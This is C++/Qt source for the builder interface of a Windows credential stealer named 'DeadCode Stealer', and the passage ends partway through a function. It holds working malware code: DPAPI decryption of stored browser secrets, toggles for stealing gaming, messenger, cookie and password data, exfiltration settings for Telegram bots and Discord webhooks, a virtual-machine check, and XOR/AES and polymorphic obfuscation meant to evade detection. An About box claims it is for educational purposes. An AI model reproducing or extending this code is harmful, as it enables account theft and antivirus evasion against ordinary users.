#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"
#include "stealerworker.h"

#include <QMutexLocker>
#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QDateTime>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

// Зашифрованные строки
const std::string encryptedDiscordPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3";
const std::string encryptedSteamPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3";
const std::string encryptedTelegramPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3";
const std::string encryptedErrorMessage = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3";
const std::string encryptedLogMessage = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3";
const std::string encryptedSuccessMessage = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0";

// Глобальная переменная
MainWindow* g_mainWindow = nullptr;

// Callback для curl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Удобный метод для логов
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    QString timestamp = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss");
    emit logUpdated("[" + timestamp + "] " + message);
}

// Обновление конфигурации из UI
void MainWindow::updateConfigFromUI() {
    QMutexLocker locker(&logMutex);
    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.buildMethod = buildMethodComboBox->currentText().toStdString();
    config.telegramBotToken = tokenLineEdit->text().toStdString();
    config.telegramChatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();
    config.discord = discordCheckBox->isChecked();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
    config.selfDestruct = selfDestructCheckBox->isChecked();
}

// Расшифровка строк
std::string MainWindow::decryptString(const std::string& encrypted, size_t keyOffset) {
    std::string decrypted;
    for (size_t i = 0; i < encrypted.size(); ++i) {
        decrypted += encrypted[i] ^ (0xAA + ((i + keyOffset) % 0xFF));
    }
    return decrypted;
}

// Расшифровка через DPAPI
QByteArray MainWindow::decryptDPAPIData(const QByteArray& encryptedData) {
    DATA_BLOB inBlob, outBlob;
    inBlob.pbData = (BYTE*)encryptedData.data();
    inBlob.cbData = encryptedData.size();
    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        QByteArray decryptedData((char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData);
        return decryptedData;
    } else {
        emitLog("Ошибка расшифровки DPAPI: " + QString::number(GetLastError()));
        return QByteArray();
    }
}

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this;

    // Инициализация UI
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->fileNameLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    selfDestructCheckBox = ui->selfDestructCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    clearLogsButton = ui->clearLogsButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Значения по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});
    fileNameLineEdit->setText("DeadCode.exe");
    textEdit->setPlaceholderText("Logs will appear here...");

    // Загрузка настроек
    QSettings settings("DeadCode", "Stealer");
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();
    discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    selfDestructCheckBox->setChecked(config.selfDestruct);

    // Анимации
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Статус
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->clearLogsButton, &QPushButton::clicked, this, &MainWindow::on_clearLogsButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::saveConfig);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::loadConfig);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::exportLogs);
    connect(ui->actionExit, &QAction::triggered, this, &QApplication::quit);
    connect(ui->actionAbout, &QAction::triggered, this, [this]() {
        QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей.\n\n© 2025");
    });
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    updateConfigFromUI();
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
}

// Анимация секций
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Генерация случайной строки
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);
    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }
    return result;
}

// Генерация XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? encryptionKey1 : encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) encryptionKey1 = keyStr;
        else encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i]);
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    if (RAND_bytes(iv.data(), iv.size()) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать IV для AES");
        std::fill(iv.begin(), iv.end(), 0);
    }
    return iv;
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            std::string biosVersion(buffer);
            if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    QByteArray result;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES: " + QString::number(status, 16));
        return QByteArray();
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    DWORD bytesEncrypted = 0;
    DWORD resultSize = data.size() + 16;
    std::vector<UCHAR> encryptedData(resultSize);

    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           encryptedData.data(), resultSize, &bytesEncrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка шифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    result = QByteArray((char*)encryptedData.data(), bytesEncrypted);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Дешифрование данных
std::string MainWindow::decryptData(const std::string& encryptedData) {
    if (encryptedData.size() < 16) {
        emitLog("Ошибка: Данные слишком малы для дешифрования (нет IV)");
        return "";
    }

    std::array<unsigned char, 16> iv;
    std::memcpy(iv.data(), encryptedData.data(), 16);
    QByteArray encryptedByteData(encryptedData.data() + 16, encryptedData.size() - 16);
    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES для дешифрования: " + QString::number(status, 16));
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key2.data(), (ULONG)key2.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES для дешифрования: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    DWORD bytesDecrypted = 0;
    DWORD resultSize = encryptedByteData.size();
    std::vector<UCHAR> decryptedData(resultSize);

    status = BCryptDecrypt(hKey, (PUCHAR)encryptedByteData.data(), encryptedByteData.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           decryptedData.data(), resultSize, &bytesDecrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка дешифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    QByteArray xorData((char*)decryptedData.data(), bytesDecrypted);
    QByteArray decryptedByteData = applyXOR(xorData, key1);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return std::string(decryptedByteData.constData(), decryptedByteData.size());
}

// Генерация ключей шифрования
void MainWindow::generateEncryptionKeys() {
    emitLog("Генерация ключей шифрования...");
    const int keyLength = 32;
    const int saltLength = 16;
    std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);

    encryptionKey1.clear();
    for (int i = 0; i < keyLength; ++i) {
        encryptionKey1 += chars[dis(gen)];
    }
    encryptionKey2.clear();
    for (int i = 0; i < keyLength; ++i) {
        encryptionKey2 += chars[dis(gen)];
    }
    encryptionSalt.clear();
    for (int i = 0; i < saltLength; ++i) {
        encryptionSalt += chars[dis(gen)];
    }
    emitLog("Ключи шифрования сгенерированы: key1=" + QString::fromStdString(encryptionKey1) +
            ", key2=" + QString::fromStdString(encryptionKey2) +
            ", salt=" + QString::fromStdString(encryptionSalt));
}

// Обфускация исполняемого файла
void MainWindow::obfuscateExecutable(const std::string& exePath) {
    emitLog("Обфускация исполняемого файла: " + QString::fromStdString(exePath));
    std::ifstream inFile(exePath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть файл для обфускации");
        return;
    }
    std::vector<char> exeData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::array<unsigned char, 16> obfKey;
    if (RAND_bytes(obfKey.data(), obfKey.size()) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать ключ для обфускации");
        return;
    }

    for (size_t i = 0; i < exeData.size(); ++i) {
        exeData[i] ^= obfKey[i % obfKey.size()];
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1024, 4096);
    int junkSize = dis(gen);
    std::vector<char> junkData(junkSize);
    RAND_bytes((unsigned char*)junkData.data(), junkSize);

    std::string obfPath = exePath + ".obf";
    std::ofstream outFile(obfPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать обфусцированный файл");
        return;
    }
    outFile.write(exeData.data(), exeData.size());
    outFile.write(junkData.data(), junkData.size());
    outFile.close();

    std::filesystem::rename(obfPath, exePath);
    emitLog("Файл успешно обфусцирован: " + QString::fromStdString(exePath));
}

// Полиморфная обфускация
void MainWindow::applyPolymorphicObfuscation(const std::string& exePath) {
    emitLog("Применение полиморфной обфускации: " + QString::fromStdString(exePath));
    std::ifstream inFile(exePath, std::ios::binary);
    if (!inFile.is_open()) {
        emitLog("Ошибка: Не удалось открыть файл для полиморфной обфускации");
        return;
    }
    std::vector<char> exeData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    unsigned char key[32];
    if (RAND_bytes(key, sizeof(key)) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать ключ для полиморфной обфускации");
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        emitLog("Ошибка: Не удалось создать контекст шифрования");
        return;
    }

    unsigned char iv[16];
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        emitLog("Ошибка: Не удалось сгенерировать IV");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv) != 1) {
        emitLog("Ошибка: Не удалось инициализировать шифрование");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    std::vector<unsigned char> encryptedData(exeData.size() + EVP_MAX_BLOCK_LENGTH);
    int outLen = 0;
    int totalLen = 0;

    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &outLen, (unsigned char*)exeData.data(), exeData.size()) != 1) {
        emitLog("Ошибка: Не удалось выполнить шифрование");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    totalLen += outLen;

    if (EVP_EncryptFinal_ex(ctx, encryptedData.data() + outLen, &outLen) != 1) {
        emitLog("Ошибка: Не удалось завершить шифрование");
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    totalLen += outLen;

    EVP_CIPHER_CTX_free(ctx);

    std::string polyPath = exePath + ".poly";
    std::ofstream outFile(polyPath, std::ios::binary);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для полиморфной обфускации");
        return;
    }
    outFile.write((char*)iv, sizeof(iv));
    outFile.write((char*)encryptedData.data(), totalLen);
    outFile.close();

    std::filesystem::rename(polyPath, exePath);
    emitLog("Полиморфная обфускация успешно применена: " + QString::fromStdString(exePath));
}

// Генерация полиморфного кода
std::string MainWindow::generatePolymorphicCode() {
    emitLog("Генерация полиморфного кода...");
    std::ofstream polyFile("src/polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h");
        isBuilding = false;
        return "";
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <chrono>\n#include <thread>\n\n";
    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n    return dis(gen);\n}\n\n";
    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n    }\n    return result;\n}\n\n";
    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\" << getRandomNumber(10000, 99999) << \"_\" << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n}\n\n";
    polyFile << "namespace Polymorphic {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";
    polyFile << "} // namespace Polymorphic\n\n#endif // POLYMORPHIC_CODE_H\n";
    polyFile.close();
    emitLog("Полиморфный код сгенерирован в src/polymorphic_code.h");

    std::stringstream polyCode;
    polyCode << "#include \"polymorphic_code.h\"\nvoid runPolymorphicCode() {\n    Polymorphic::executePolymorphicCode();\n}\n";
    return polyCode.str();
}

// Генерация заголовка ключей
void MainWindow::generateBuildKeyHeader(const std::string& encryptionKey) {
    emitLog("Генерация заголовочного файла ключей...");
    std::ofstream keyFile("src/build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <random>\n#include <cstring>\n\n";
    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << encryptionSalt << "\";\n";
    keyFile << "const std::string BUILD_ENCRYPTION_KEY = \"" << encryptionKey << "\";\n\n";
    keyFile << "inline std::array<unsigned char, 16> GenerateUniqueKey() {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n    std::random_device rd;\n    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (size_t i = 0; i < 16; ++i) {\n        key[i] = static_cast<unsigned char>(dis(gen));\n    }\n    return key;\n}\n\n";
    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<> dis(0, 255);\n    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n    }\n    return ss.str();\n}\n\n";
    keyFile << "inline std::string GetXorKey() {\n";
    keyFile << "    std::string key1 = ENCRYPTION_KEY_1;\n    std::string key2 = ENCRYPTION_KEY_2;\n    std::string salt = ENCRYPTION_SALT;\n    std::string combined = key1 + key2 + salt;\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    for (size_t i = 0; i < 16; ++i) {\n        key[i] = static_cast<unsigned char>(combined[i % combined.length()]);\n    }\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (const auto& byte : key) {\n        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);\n    }\n    return ss.str();\n}\n\n";
    keyFile << "inline std::string GetBuildEncryptionKey() {\n    return BUILD_ENCRYPTION_KEY;\n}\n\n";
